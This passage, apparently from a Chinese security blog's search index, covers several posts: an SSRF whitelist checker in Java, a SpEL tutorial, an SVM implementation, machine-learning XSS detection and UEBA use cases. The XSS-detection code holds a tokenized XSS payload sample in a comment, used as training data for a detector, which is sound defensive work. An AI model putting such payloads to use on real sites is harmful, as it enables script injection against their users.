SSRFWhiteChecker instance = null;    public SSRFWhiteChecker()&#123;    &#125;    public static SSRFWhiteChecker getInstance() &#123;        if (null == instance) &#123;            synchronized (SSRFWhiteChecker.class) &#123;                if (null == instance) &#123;                    instance = new SSRFWhiteChecker();                &#125;            &#125;        &#125;        return instance;    &#125;    /**     * @Description: 校验url是否在白名单内     * @Param: url 网络地址     * @return: boolean true 在白名单内；false 不在白名单内     */    public boolean verifyURL(String url)&#123;        return super.verifyURL(url);    &#125;&#125;\n\n2.2 防止重定向绕过对每次跳转都进行判断\n\n2.3 利用NetHooks实现TCP请求前置判断通过sun.net.NetHooks实现拦截TCP请求，进行host判断。\n\n该类的方法如下\n/** * 定义要在绑定或连接TCP套接字之前调用的静态方法。 */public final class NetHooks &#123;    /**     * 带钩子的提供者，允许在绑定或连接TCP套接字之前转换套接字。     *     * &lt;p&gt; 这个类的具体实现应该定义一个零参数构造函数，并实现下面指定的抽象方法。     */    public static abstract class Provider &#123;        /**         *初始化该类的新实例。         */        protected Provider() &#123;&#125;        /**         *在绑定TCP套接字之前调用。         */        public abstract void implBeforeTcpBind(FileDescriptor fdObj,                                               InetAddress address,                                               int port)            throws IOException;        /**         *在连接未绑定的TCP套接字之前调用。         */        public abstract void implBeforeTcpConnect(FileDescriptor fdObj,                                                 InetAddress address,                                                 int port)            throws IOException;    &#125;    /**     * 现在，我们在Solaris上加载SDP provider。将来，这可能会被更改为使用ServiceLoader工具，以允许部署其他提供者。     */    private static final Provider provider = new sun.net.sdp.SdpProvider();    /**     * 在绑定TCP套接字之前调用。     */    public static void beforeTcpBind(FileDescriptor fdObj,                                     InetAddress address,                                     int port)        throws IOException    &#123;        provider.implBeforeTcpBind(fdObj, address, port);    &#125;    /**     * 在连接未绑定的TCP套接字之前调用。     */    public static void beforeTcpConnect(FileDescriptor fdObj,                                        InetAddress address,                                        int port)        throws IOException    &#123;        provider.implBeforeTcpConnect(fdObj, address, port);    &#125;&#125;\n\n\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"Security & Data","url":"/Security%20&%20Data/","content":"\n","categories":["安全数据分析"],"tags":["ML"]},{"title":"Spring Expression Language（SpEL）","url":"/Spring%20Expression%20Language%EF%BC%88SpEL%EF%BC%89/","content":"0x00 简介SpEL（Spring Expression Language）是Spring提供的一种表达式语言\n能在运行时构建复杂表达式、存取对象图属性、对象方法调用等，并且能与Spring功能完美整合，如能用来配置Bean定义\n表达式语言给静态Java语言增加了动态功能\n0x01 表达式执行步骤SpEL求表达式值时的步骤\n1、构造一个解析器\n    SpEL使用ExpressionParser接口表示解析器，提供SpelExpressionParser默认实现\n2、解析器解析字符串表达式\n    使用ExpressionParser的parseExpression来解析相应的表达式为Expression对象\n3、构造上下文\n    准备比如变量定义等等表达式需要的上下文数据\n4、根据上下文得到表达式运算后的值\n    通过Expression接口的getValue方法根据上下文获得表达式值\n\nExpressionParser parser = new SpelExpressionParser(); （1）Expression exp = parser.parseExpression(&quot;&#x27;Hello World&#x27;&quot;); （2）String message = (String) exp.getValue(); （4）ExpressionParser parser = new SpelExpressionParser();    (1)Expression expression = parser.parseExpression(&quot;(&#x27;Hello&#x27; + &#x27; World&#x27;).concat(#end)&quot;);   (2) EvaluationContext context = new StandardEvaluationContext();    (3)context.setVariable(&quot;end&quot;, &quot;!&quot;);    Assert.assertEquals(&quot;Hello World!&quot;, expression.getValue(context));   (4) \n\n0x02 工作原理\n0x03 主要接口EvaluationContext表示上下文环境默认实现是org.springframework.expression.spel.support包中的StandardEvaluationContext类使用setRootObject方法来设置根对象，使用setVariable方法来注册自定义变量，使用registerFunction来注册自定义函数等\n下例表达式name表示对应EvaluationContext的rootObject的一个属性\npublic void EvaluationContextTest() &#123;\tObject user = new Object() &#123;\t\tpublic String getName() &#123;\t\t\treturn &quot;abc&quot;;\t\t&#125;\t&#125;;\tEvaluationContext context = new StandardEvaluationContext(user);\tExpressionParser parser = new SpelExpressionParser();\tAssert.assertTrue(parser.parseExpression(&quot;name&quot;).getValue(context, String.class).equals(&quot;abc&quot;));\tAssert.assertTrue(parser.parseExpression(&quot;getName()&quot;).getValue(context, String.class).equals(&quot;abc&quot;));&#125;\n\nExpressionParser表示解析器默认实现是org.springframework.expression.spel.standard包中的SpelExpressionParser类，使用parseExpression方法将字符串表达式转换为Expression对象对于ParserContext接口用于定义字符串表达式是不是模板，及模板开始与结束字符\npublic interface ExpressionParser &#123;        Expression parseExpression(String expressionString);        Expression parseExpression(String expressionString, ParserContext context);    &#125;  public void testParserContext() &#123;        ExpressionParser parser = new SpelExpressionParser();        ParserContext parserContext = new ParserContext() &#123;            @Override             public boolean isTemplate() &#123;                return true;            &#125;            @Override            public String getExpressionPrefix() &#123;                return &quot;#&#123;&quot;;            &#125;            @Override            public String getExpressionSuffix() &#123;                return &quot;&#125;&quot;;            &#125;        &#125;;        String template = &quot;#&#123;&#x27;Hello &#x27;&#125;#&#123;&#x27;World!&#x27;&#125;&quot;;        Expression expression = parser.parseExpression(template, parserContext);        Assert.assertEquals(&quot;Hello World!&quot;, expression.getValue());    &#125;  \n\nExpression表示表达式对象默认实现是org.springframework.expression.spel.standard包中的SpelExpression提供getValue方法用于获取表达式值，提供setValue方法用于设置对象值\nExpressionParser parser = new SpelExpressionParser();    (1)Expression expression = parser.parseExpression(&quot;(&#x27;Hello&#x27; + &#x27; World&#x27;).concat(#end)&quot;);   (2) EvaluationContext context = new StandardEvaluationContext();    (3)context.setVariable(&quot;end&quot;, &quot;!&quot;);    Assert.assertEquals(&quot;Hello World!&quot;, expression.getValue(context));   (4) \n\n0x04 主要功能Literal expressionsBoolean and relational operatorsRegular expressionsClass expressionsAccessing properties, arrays, lists, mapsMethod invocationRelational operatorsAssignmentCalling constructorsBean referencesArray constructionInline listsTernary operatorVariablesUser defined functionsCollection projectionCollection selectionTemplated expressions\n\n参考：https://docs.spring.io/spring/docs/3.0.x/reference/expressions.htmlhttps://blog.csdn.net/zhoudaxia/article/details/38174169https://github.com/elim168/elim168.github.io/blob/master/spring/bean/23.spel%E8%A1%A8%E8%BE%BE%E5%BC%8F.md\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"Support Vector Machines（SVM）","url":"/Support%20Vector%20Machines%EF%BC%88SVM%EF%BC%89/","content":"0x01 SVM实现算法：序列最小优化（SMO）\n支持向量：离分割超平面最近的那些点\n优点：\n\n范化错误率低\n计算开销不大\n结果易解释\n\n缺点：\n\n对参数调节和核函数的选择敏感\n原始分类器需要修改才能处理多分类问题\n\n适用数据类型：\n\n数值型\n标称型\n\n0x02 SMO将大优化问题分解为多个小优化问题来求解\n目标是求出一系列alpha和b，一旦求出了这些alpha，就很容易计算出权重向量w并得到分隔超平面\n工作原理是:每次循环中选择两个alpha进行优化处理。一旦找到一对合适的alpha，那么就增大其中一个同时减小另一个\n\n简化版实现\n\ndef selectJrand(i, m):    &#x27;&#x27;&#x27;    在某个区间范围内随机选择一个整数    :param i: 第i个alpha的下标    :param m: 所有alpha的数目    :return:    &#x27;&#x27;&#x27;    j=i    while (j==i):        j = int(random.uniform(0, m))    return jdef clipAlpha(aj, H, L):    &#x27;&#x27;&#x27;    用于调整大于H或小于L的alpha值    :param aj:    :param H:    :param L:    :return:    &#x27;&#x27;&#x27;    if aj &gt; H:         aj = H    if L &gt; aj:        aj = L    return ajdef smoSimple(dataMatIn, classLabels, C, toler, maxIter):    &#x27;&#x27;&#x27;    :param dataMatIn:数据集    :param classLabels:类别标签    :param C:常数C    :param toler:容错率    :param maxIter:退出前的最大循环次数    :return:    &#x27;&#x27;&#x27;    dataMatrix = mat(dataMatIn)    labelMat = mat(classLabels).transpose()    b = 0    m, n = shape(dataMatrix)    alphas = mat(zeros((m, 1)))    iter = 0 #记录循环次数    while (iter &lt; maxIter):        alphaPairsChanged = 0 #用于记录alpha是否优化        for i in range(m):            fXi = float(multiply(alphas, labelMat).T*(dataMatrix*dataMatrix[i, :].T)) + b #预测的类别            Ei = fXi - float(labelMat[i])#预测和实际的误差            #如果误差过大，则进行优化            if ((labelMat[i]*Ei &lt; -toler) and (alphas[i] &lt; C)) or ((labelMat[i]*Ei &gt; toler) and (alphas[i] &gt; 0)):                j = selectJrand(i, m) #随机选择第二个alpha值                fXj = float(multiply(alphas, labelMat).T*(dataMatrix*dataMatrix[j, :].T)) + b #预测类别                Ej = fXj - float(labelMat[j]) #误差                alphaIold = alphas[i].copy()                alphaJold = alphas[j].copy()                #计算L和H                if (labelMat[i] != labelMat[j]):                    L = max(0, alphas[j] - alphas[i])                    H = min(C, C + alphas[j] - alphas[i])                else:                    L = max(0, alphas[j] + alphas[i] - C)                    H = min(C, alphas[j] + alphas[i])                if L==H:                    print(&quot;L==H&quot;)                    continue                eta = 2.0 * dataMatrix[i, :]*dataMatrix[j, :].T - dataMatrix[i, :]*dataMatrix[i, :].T - dataMatrix[j, :]*dataMatrix[j, :].T #最优修改量                if eta &gt;= 0:                    print(&quot;eta&gt;=0&quot;)                    continue                alphas[j] -= labelMat[j]*(Ei - Ej)/eta                alphas[j] = clipAlpha(alphas[j], H, L)                if (abs(alphas[j] - alphaJold) &lt; 0.00001):                    print(&quot;j not moving enough&quot;)                    continue                alphas[i] += labelMat[j]*labelMat[i]*(alphaJold - alphas[j])#修改i，修改量和j相同，方向相反                #设置常数项                b1 = b - Ei - labelMat[i]*(alphas[i]-alphaIold)*dataMatrix[i, :]*dataMatrix[i, :].T - labelMat[j]*(alphas[j]-alphaJold)*dataMatrix[i, :]*dataMatrix[j, :].T                b2 = b - Ej - labelMat[i]*(alphas[i]-alphaIold)*dataMatrix[i, :]*dataMatrix[j, :].T - labelMat[j]*(alphas[j]-alphaJold)*dataMatrix[j, :]*dataMatrix[j, :].T                if (0 &lt; alphas[i]) and (C &gt; alphas[i]):                    b = b1                elif (0 &lt; alphas[j]) and (C &gt; alphas[j]):                    b = b2                else:                    b = (b1 + b2)/2.0                alphaPairsChanged += 1                print(&quot;iter: %d i:%d, pairs changed %d&quot; % (iter, i, alphaPairsChanged))        if (alphaPairsChanged == 0):            iter += 1        else:            iter = 0        print(&quot;iteration number: %d&quot; % iter)    return b, alphas\n\n\n找出哪些点是支持向量\nfor i in range(100):    if alphas[i] &gt; 0.0:        print(dateArr[i], labelArr[i])\n\n\n\n完整版实现\n\n\nclass optStruct:    def __init__(self, dataMatIn, classLabels, C, toler, kTup):  # Initialize the structure with the parameters        self.X = dataMatIn        self.labelMat = classLabels        self.C = C        self.tol = toler        self.m = shape(dataMatIn)[0]        self.alphas = mat(zeros((self.m, 1)))        self.b = 0        self.eCache = mat(zeros((self.m, 2))) #first column is valid flag        self.K = mat(zeros((self.m, self.m)))        for i in range(self.m):            self.K[:, i] = kernelTrans(self.X, self.X[i, :], kTup)        def calcEk(oS, k):    &#x27;&#x27;&#x27;    计算E值并返回    :param oS:    :param k:    :return:    &#x27;&#x27;&#x27;    fXk = float(multiply(oS.alphas, oS.labelMat).T*oS.K[:, k] + oS.b)    Ek = fXk - float(oS.labelMat[k])    return Ek        def selectJ(i, oS, Ei):    &#x27;&#x27;&#x27;    选择第二个alpha    :param i:    :param oS:    :param Ei:    :return:    &#x27;&#x27;&#x27;    maxK = -1    maxDeltaE = 0    Ej = 0    oS.eCache[i] = [1, Ei]    validEcacheList = nonzero(oS.eCache[:, 0].A)[0]    if (len(validEcacheList)) &gt; 1:        for k in validEcacheList:            if k == i:                continue            Ek = calcEk(oS, k)            deltaE = abs(Ei - Ek)            if (deltaE &gt; maxDeltaE):                maxK = k                maxDeltaE = deltaE                Ej = Ek        return maxK, Ej    else:        j = selectJrand(i, oS.m)        Ej = calcEk(oS, j)    return j, Ejdef updateEk(oS, k):    &#x27;&#x27;&#x27;    计算误差值并存入缓存    :param oS:    :param k:    :return:    &#x27;&#x27;&#x27;    Ek = calcEk(oS, k)    oS.eCache[k] = [1, Ek]        def innerL(i, oS):    &#x27;&#x27;&#x27;    优化过程    :param i:    :param oS:    :return:    &#x27;&#x27;&#x27;    Ei = calcEk(oS, i)    if ((oS.labelMat[i]*Ei &lt; -oS.tol) and (oS.alphas[i] &lt; oS.C)) or ((oS.labelMat[i]*Ei &gt; oS.tol) and (oS.alphas[i] &gt; 0)):        j, Ej = selectJ(i, oS, Ei)        alphaIold = oS.alphas[i].copy(); alphaJold = oS.alphas[j].copy()        if (oS.labelMat[i] != oS.labelMat[j]):            L = max(0, oS.alphas[j] - oS.alphas[i])            H = min(oS.C, oS.C + oS.alphas[j] - oS.alphas[i])        else:            L = max(0, oS.alphas[j] + oS.alphas[i] - oS.C)            H = min(oS.C, oS.alphas[j] + oS.alphas[i])        if L==H:            print(&quot;L==H&quot;)            return 0        eta = 2.0 * oS.K[i, j] - oS.K[i, i] - oS.K[j, j]        if eta &gt;= 0:            print(&quot;eta&gt;=0&quot;)            return 0        oS.alphas[j] -= oS.labelMat[j]*(Ei - Ej)/eta        oS.alphas[j] = clipAlpha(oS.alphas[j], H, L)        updateEk(oS, j)        if (abs(oS.alphas[j] - alphaJold) &lt; 0.00001):            print(&quot;j not moving enough&quot;)            return 0        oS.alphas[i] += oS.labelMat[j]*oS.labelMat[i]*(alphaJold - oS.alphas[j])        updateEk(oS, i)        b1 = oS.b - Ei - oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.K[i, i] - oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.K[i, j]        b2 = oS.b - Ej - oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.K[i, j] - oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.K[j, j]        if (0 &lt; oS.alphas[i]) and (oS.C &gt; oS.alphas[i]):            oS.b = b1        elif (0 &lt; oS.alphas[j]) and (oS.C &gt; oS.alphas[j]):            oS.b = b2        else:            oS.b = (b1 + b2)/2.0        return 1    else:        return 0def smoP(dataMatIn, classLabels, C, toler, maxIter,kTup=(&#x27;lin&#x27;, 0)):    &#x27;&#x27;&#x27;    完整的SMO外循环    :param dataMatIn:    :param classLabels:    :param C:    :param toler:    :param maxIter:    :param kTup:    :return:    &#x27;&#x27;&#x27;    oS = optStruct(mat(dataMatIn), mat(classLabels).transpose(), C, toler, kTup)    iter = 0    entireSet = True    alphaPairsChanged = 0    while (iter &lt; maxIter) and ((alphaPairsChanged &gt; 0) or (entireSet)):        alphaPairsChanged = 0        if entireSet:            for i in range(oS.m):                        alphaPairsChanged += innerL(i,oS)                print(&quot;fullSet, iter: %d i:%d, pairs changed %d&quot; % (iter, i, alphaPairsChanged))            iter += 1        else:            nonBoundIs = nonzero((oS.alphas.A &gt; 0) * (oS.alphas.A &lt; C))[0]            for i in nonBoundIs:                alphaPairsChanged += innerL(i, oS)                print(&quot;non-bound, iter: %d i:%d, pairs changed %d&quot; % (iter, i, alphaPairsChanged))            iter += 1        if entireSet:            entireSet = False        elif (alphaPairsChanged == 0):            entireSet = True        print(&quot;iteration number: %d&quot; % iter)    return oS.b, oS.alphasdef calcWs(alphas, dataArr, classLabels):    &#x27;&#x27;&#x27;    利用计算出的alpha进行分类    :param alphas:    :param dataArr:    :param classLabels:    :return:    &#x27;&#x27;&#x27;    X = mat(dataArr)    labelMat = mat(classLabels).transpose()    m, n = shape(X)    w = zeros((n, 1))    for i in range(m):        w += multiply(alphas[i]*labelMat[i], X[i, :].T)    return w\n\nfor i in range(100):        if alphas[i] &gt; 0.0:            print(dateArr[i], labelArr[i])    ws = calcWs(alphas, dateArr, labelArr)    print(ws)    datmat = mat(dateArr)    print(datmat[0]*mat(ws) + b)\n\n\n最后一行为测试结果，小于0属于-1类，大于0属于1类，等于0属于-1类\n0x03 kernel\n\n将数据映射到高维空间\n\n将数据从一个特征空间转换到另一个特征空间映射会将低维特征空间映射到高维空间\n\n径向基核函数\n\n\ndef kernelTrans(X, A, kTup):    &#x27;&#x27;&#x27;    核函数    :param X:    :param A:    :param kTup:包含核函数信息的元组    :return:    &#x27;&#x27;&#x27;    m, n = shape(X)    K = mat(zeros((m, 1)))    if kTup[0]==&#x27;lin&#x27;:        K = X * A.T    elif kTup[0]==&#x27;rbf&#x27;:        for j in range(m):            deltaRow = X[j, :] - A            K[j] = deltaRow*deltaRow.T        K = exp(K/(-1*kTup[1]**2))    else:        raise NameError(&#x27;Houston We Have a Problem -- That Kernel is not recognized&#x27;)    return K\n\n测试\ndef testRbf(k1=1.3):    dataArr,labelArr = loadDataSet(&#x27;testSetRBF.txt&#x27;)    b,alphas = smoP(dataArr, labelArr, 200, 0.0001, 10000, (&#x27;rbf&#x27;, k1))    datMat=mat(dataArr)    labelMat = mat(labelArr).transpose()    svInd=nonzero(alphas.A&gt;0)[0]    sVs=datMat[svInd]    labelSV = labelMat[svInd]    print(&quot;there are %d Support Vectors&quot; % shape(sVs)[0])    m, n = shape(datMat)    errorCount = 0    for i in range(m):        kernelEval = kernelTrans(sVs, datMat[i, :], (&#x27;rbf&#x27;, k1))        predict = kernelEval.T * multiply(labelSV, alphas[svInd]) + b        if sign(predict) != sign(labelArr[i]):            errorCount += 1    print(&quot;the training error rate is: %f&quot; % (float(errorCount)/m))    dataArr, labelArr = loadDataSet(&#x27;testSetRBF2.txt&#x27;)    errorCount = 0    datMat=mat(dataArr)    labelMat = mat(labelArr).transpose()    m,n = shape(datMat)    for i in range(m):        kernelEval = kernelTrans(sVs, datMat[i, :], (&#x27;rbf&#x27;, k1))        predict = kernelEval.T * multiply(labelSV, alphas[svInd]) + b        if sign(predict) != sign(labelArr[i]):            errorCount += 1    print(&quot;the test error rate is: %f&quot; % (float(errorCount)/m))\n\n\n0x04 实例1基于SVM的手写数字识别\ndef testDigits(kTup=(&#x27;rbf&#x27;, 10)):    dataArr,labelArr = loadImages(&#x27;../Ch02/digits/trainingDigits&#x27;)    b,alphas = smoP(dataArr, labelArr, 200, 0.0001, 10000, kTup)    datMat=mat(dataArr)    labelMat = mat(labelArr).transpose()    svInd=nonzero(alphas.A &gt; 0)[0]    sVs=datMat[svInd]     labelSV = labelMat[svInd]    print(&quot;there are %d Support Vectors&quot; % shape(sVs)[0])    m, n = shape(datMat)    errorCount = 0    for i in range(m):        kernelEval = kernelTrans(sVs, datMat[i, :], kTup)        predict = kernelEval.T * multiply(labelSV, alphas[svInd]) + b        if sign(predict) != sign(labelArr[i]):            errorCount += 1    print(&quot;the training error rate is: %f&quot; % (float(errorCount)/m))    dataArr, labelArr = loadImages(&#x27;testDigits&#x27;)    errorCount = 0    datMat=mat(dataArr)    labelMat = mat(labelArr).transpose()    m, n = shape(datMat)    for i in range(m):        kernelEval = kernelTrans(sVs, datMat[i, :], kTup)        predict=kernelEval.T * multiply(labelSV, alphas[svInd]) + b        if sign(predict)!=sign(labelArr[i]):            errorCount += 1    print(&quot;the test error rate is: %f&quot; % (float(errorCount)/m))\n\n\n\n0x05 实例2XSS Detection\n0x01 数据在github上看到https://github.com/SparkSharly/DL_for_xss 这个项目，感觉不错，学习一下，数据集项目中已经附带，就直接使用了\n\neg. normal_examples.csv （20w+取部分）\n\n\n\neg. xssed.csv （4W+取部分）\n\n\n0x02 分词def GeneSeg(payload):    #数字泛化为&quot;0&quot;    payload=payload.lower()    payload=unquote(unquote(payload))    payload,num=re.subn(r&#x27;\\d+&#x27;,&quot;0&quot;,payload)    #替换url为”http://u    payload,num=re.subn(r&#x27;(http|https)://[a-zA-Z0-9\\.@&amp;/#!#\\?]+&#x27;, &quot;http://u&quot;, payload)    #分词    r = &#x27;&#x27;&#x27;        (?x)[\\w\\.]+?\\(        |\\)        |&quot;\\w+?&quot;        |&#x27;\\w+?&#x27;        |http://\\w        |&lt;/\\w+&gt;        |&lt;\\w+&gt;        |&lt;\\w+        |\\w+=        |&gt;        |[\\w\\.]+    &#x27;&#x27;&#x27;    return nltk.regexp_tokenize(payload, r)\n\n\n0x03 特征\n建立xss语义模型，构建词汇表\n\n统计高频出现的300词构建词表\nwords=[]datas=[]with open(&quot;data/xssed.csv&quot;,&quot;r&quot;,encoding=&quot;utf-8&quot;) as f:    reader=csv.DictReader(f,fieldnames=[&quot;payload&quot;])    for row in reader:        payload=row[&quot;payload&quot;]        word=GeneSeg(payload)        datas.append(word)        words+=word#构建数据集def build_dataset(datas,words):    count=[[&quot;UNK&quot;,-1]]    counter=Counter(words)    count.extend(counter.most_common(vocabulary_size-1))    #print(count)    vocabulary=[c[0] for c in count]    #print(vocabulary)    data_set=[]    for data in datas:        d_set=[]        for word in data:            if word in vocabulary:                d_set.append(word)            else:                d_set.append(&quot;UNK&quot;)                count[0][1]+=1        data_set.append(d_set)    print(data_set)\n\n\nword2vec建模\n\nmodel=Word2Vec(data_set,size=embedding_size,window=skip_window,negative=num_sampled,iter=num_iter)\n\n\n空间维度设置为32维\n\n查看建模结果，与&lt;/script&gt;最语义最相近的词\n\n\n数据处理\n\ndef pre_process():    with open(vec_dir,&quot;rb&quot;) as f :        word2vec=pickle.load(f)        #词表（&#x27;UNK&#x27;: 0, &#x27;0&#x27;: 1）        dictionary=word2vec[&quot;dictionary&quot;]        #维度值        embeddings=word2vec[&quot;embeddings&quot;]        #反向词表（num和word调换，0: &#x27;UNK&#x27;, 1: &#x27;0&#x27;）        reverse_dictionary = word2vec[&quot;reverse_dictionary&quot;]    xssed_data=[]    normal_data=[]    with open(&quot;data/xssed.csv&quot;,&quot;r&quot;,encoding=&quot;utf-8&quot;) as f:        reader = csv.DictReader(f, fieldnames=[&quot;payload&quot;])        for row in reader:            payload=row[&quot;payload&quot;]            #分词[&#x27;search=&#x27;, &#x27;&lt;/script&gt;&#x27;, &#x27;&lt;img&#x27;, &#x27;src=&#x27;, &#x27;worksinchrome&#x27;, &#x27;colon&#x27;, &#x27;prompt&#x27;, &#x27;x0&#x27;, &#x27;0&#x27;, &#x27;x0&#x27;, &#x27;onerror=&#x27;, &#x27;eval(&#x27;, &#x27;src&#x27;, &#x27;)&#x27;, &#x27;&gt;&#x27;]            word=GeneSeg(payload)            xssed_data.append(word)    with open(&quot;data/normal_examples.csv&quot;,&quot;r&quot;,encoding=&quot;utf-8&quot;) as f:        reader = csv.DictReader(f, fieldnames=[&quot;payload&quot;])        for row in reader:            payload=row[&quot;payload&quot;]            word=GeneSeg(payload)            normal_data.append(word)    xssed_num=len(xssed_data)    normal_num=len(normal_data)    #生成标签[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]    xssed_labels=[1]*xssed_num    normal_labels=[0]*normal_num    datas=xssed_data+normal_data    labels=xssed_labels+normal_labels    def to_index(data):        d_index=[]        for word in data:            if word in dictionary.keys():                d_index.append(dictionary[word])            else:                d_index.append(dictionary[&quot;UNK&quot;])        return d_index    #数据转换[23, 5, 34, 14, 0, 0, 0, 0, 1, 0, 81, 0, 0, 3, 2]    datas_index=[to_index(data) for data in datas]    #长度不足maxlen的用-1在前端填充    &#x27;&#x27;&#x27;    [[ -1  -1  -1 ...   0   3   2]    [ -1  -1  -1 ...  10  17   1]    [ -1  -1  -1 ... 150   0  71]    ...    [ -1  -1  -1 ...  11   2  55]    [ -1  -1  -1 ...   5  24   1]    [ -1  -1  -1 ...   1   3   5]]    &#x27;&#x27;&#x27;    datas_index=pad_sequences(datas_index,value=-1,maxlen=maxlen)    #从有序列表中选k个作为一个片段返回，eg.[7, 6, 3, 2, 5, 8, 0, 1, 10, 4, 9]    rand=random.sample(range(len(datas_index)),len(datas_index))    #数据简单随机排序    datas=[datas_index[index] for index in rand]    labels=[labels[index] for index in rand]    datas_embed=[]    #获取UNK的维度，本例中是32    dims=len(embeddings[&quot;UNK&quot;])    n=0    for data in datas:        data_embed = []        for d in data:            if d != -1:                #如果不是填充数据，就把真实纬度值替换                data_embed.extend(embeddings[reverse_dictionary[d]])            else:                data_embed.extend([0.0] * dims)        datas_embed.append(data_embed)        &#x27;&#x27;&#x27;        [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,         0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,         0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,··· -0.5644003, 0.41219762, -1.2313833, -1.3566964,         -0.74316794, -1.2668883, 1.0586963, 1.5969143, 0.21956278, 1.1538218, -0.35007623, 0.21183407,         -0.53830135, 1.7361579, -0.08175806, -1.1915175, -1.7790002, -1.1044971, 0.40857738]        &#x27;&#x27;&#x27;        n+=1        if n%10000 ==0:            print(n)    #七成训练，三成测试     train_datas,test_datas,train_labels,test_labels=train_test_split(datas_embed,labels,test_size=0.3)    return train_datas,test_datas,train_labels,test_labels\n\n\n0x04 SVM训练通过SVM算法进行模型训练\ntrain_datas, train_labels=pre_process()print(&quot;Start Train Job! &quot;)start = time.time()model=LinearSVC()model = SVC(C=1.0, kernel=&quot;linear&quot;)model.fit(train_datas,train_labels)model.save(model_dir)end = time.time()print(&quot;Over train job in %f s&quot; % (end - start))print(&quot;Start Test Job!&quot;)start=time.time()pre=model.predict(test_datas)end=time.time()print(&quot;Over test job in %s s&quot;%(end-start))precision = precision_score(test_labels, pre)recall = recall_score(test_labels, pre)print(&quot;Precision score is :&quot;, precision)print(&quot;Recall score is :&quot;, recall)with open(model_dir,&quot;wb&quot;) as f:    pickle.dump(model,f,protocol=2)print(&quot;wirte to &quot;,model_dir)\n精确率和召回率：\n\n","categories":["安全数据分析"],"tags":["ML"]},{"title":"UEBA(用户和实体行为分析)可以用来做什么（十大场景）","url":"/UEBA(%E7%94%A8%E6%88%B7%E5%92%8C%E5%AE%9E%E4%BD%93%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90)%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%88%E5%8D%81%E5%A4%A7%E5%9C%BA%E6%99%AF%EF%BC%89/","content":"一、UEBA简介UEBA 监控用户和实体的活动（如硬件设备和网络），并将当前活动与”正常”或”基线”行为进行比较。使用先进的统计分析，在某些情况下，机器学习算法，目的是要么检测异常活动，这可能是入侵或恶意”内部”行动的迹象，或发现已知的恶意行为模式。\nUEBA VS. UBAUBA：重点是分析用户如何与数据交互UEBA：Gartner 说，UEBA 一词”认识到一个事实，即除了用户之外，其他实体经常被分析，以便更准确地定位威胁，部分原因在于将这些其他实体的行为与用户行为相关联\nUEBA VS. SIEM由于许多公司安全团队已经实现了安全信息和事件管理(SIEM)解决方案，一个常见的问题是UEBA和SIEM是否提供了相同的保护。毕竟，它们都收集与安全相关的信息，这些信息可以指示潜在的或正在发生的威胁。共同点都是收集非常多的数据进行分析，SIEM关注的更多是事件，UEBA更多的关注的是人的风险，当然这两者的界限在某些情境下可能非常窄。\n二、为什么要做UEBA1、内部的威胁往往不会触发告警2、IoCs和静态检测很多时候是没有效果的（例如URLs、C&amp;C Servers、IP Adresses等）3、攻击数据可以捕捉，但是攻击本身却很难4、大量的日志、事件、告警是容易混乱的\n1、使用异常行为来检测攻击2、使用机器模型规模分析所有的数据\n三、UEBA的十个典型场景1、登录凭证泄漏检测问题描述：    1. 凭证失窃是一个大麻烦，仅次于钓鱼攻击；    2. 黑客使用窃取的凭证和相应的权限进入内部；    3. 最厉害的安全工具也无法区分合法的未授权访问。\nUEBA解法：    1. 识别异常的账号访问、行动、设备、设备使用、应用对象进入等\n2、特权用户监控问题描述：    1. 特权账户能访问高价值资源，一旦泄漏，将会导致最大的影响；    2. 特权用户的工作模式往往不受规则限制和不可预测的。\nUEBA解法：    1. 识别特权用户通过上下文数据或者行为，例如执行管理行为或者使用特权系统等；    2. 识别风险的异常活动，通过关联多个数据源来降低误报。\n3、经营管理相关的用户、资产监控问题描述：    1. 经营管理相关的资产往往包含敏感数据，例如关于收益、合并和收购、预算计划、产品和服务计划或竞争信息等；    2. 有时候更困难的可能是确定哪些资产是经营管理相关的。\nUEBA解法：    1. 通过使用模式去自动判断经营管理相关资产；    2. 通过行为识别异常访问和活动；    3. 检测对内部有损害和恶意的使用。\n4、系统、主机、设备等的入侵检测问题描述：    1. 像IoT、OT等资产是黑客们频繁的目标，IoT是被用来获得网络访问权限的立足点，OT对于一些黑客来说是高价值目标；    2. 可能有多个用户和它们交互；    3. 许多攻击通过多个用户和资产来实现。\nUEBA解法：    1. 识别和分类设备，例如服务器、工作站、IoT设备等；    2. 构建正常行为基线，包括端口、协议、授权、访问、活动等；    3. 监测异常活动和相关联的用户。\n5、内部访问滥用问题描述：    1. 内部员工可能是恶意、被入侵或疏忽的；    2. 当攻击者进入到内网中和多个系统中后很难被检测到；    3. 在大多数传统的安全工具中，它们不会触发警报。\nUEBA解法：    1. 识别高风险、异常的行为，和它自身、同职位、同组织等相比较来检测内部威胁；    2. 通过提供全部数据中的异常行为视图来帮助识别攻击动机。\n6、横向移动检测问题描述：    1. 攻击者通过内部网络移动搜寻敏感数据和资产；    2. 在攻击者横向移动后，安全工具和安全团队经常失去攻击者的踪迹；    3. 结果可能导致全部攻击或部分攻击被忽略。\nUEBA解法：    1. 通过行为分析去检测异常账户活动、账户切换、远程连接、PTH攻击等；    2. 当攻击者在网络中移动的时候进行追踪；    3. 攻击路径复现在单时间线下是容易的。\n7、数据泄露检测问题描述：    1. 敏感数据被非法转移到组织外；    2. 恶意的、被入侵的或疏忽的内部人员导致的；    3、像DLP等流行的工具在处理这类问题是误报率较高。\nUEBA解法：    1. 识别不一样的数据访问、向外数据传输、USB活动、打印机活动、文件活动等等；    2. UEBA通过关联用户、角色、正常行为等上下文来实现低误报；    3. 在攻击生命周期中能更早的发现数据泄漏；    4. 